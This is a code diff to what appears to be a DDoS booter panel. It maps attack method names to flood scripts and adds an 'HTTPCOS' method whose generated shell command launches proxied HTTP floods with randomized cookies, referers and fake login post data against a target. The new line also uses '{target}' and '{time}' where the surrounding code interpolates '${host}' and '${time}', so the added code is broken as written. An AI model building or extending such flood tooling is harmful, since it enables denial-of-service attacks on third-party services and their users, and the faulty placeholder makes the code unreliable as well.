@@ -13,6 +13,7 @@ const methods = {
     TLS: 'tls.js',
     TLSNET: 'Tlsnet.js',
     H2MIA: 'H2ABIB.js',
+    HTTPCOS: 'HTTPCOSTUM.js',
     CATMIA: 'Vzy.js',
     MIX: 'mix.js',
     MIXBIL: 'MIXBIL.js',
@@ -31,6 +32,8 @@ const generateCommand = (method, host, port, time) => {
             return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 32 4 proxy.txt`;
+        case 'HTTPCOS':
+            return `cd /root/methods && node HTTPCOSTUM.js GET {target} {time} 4 64 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full`;
         case 'H2MIA':
             return `cd /root/methods && node H2ABIB.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
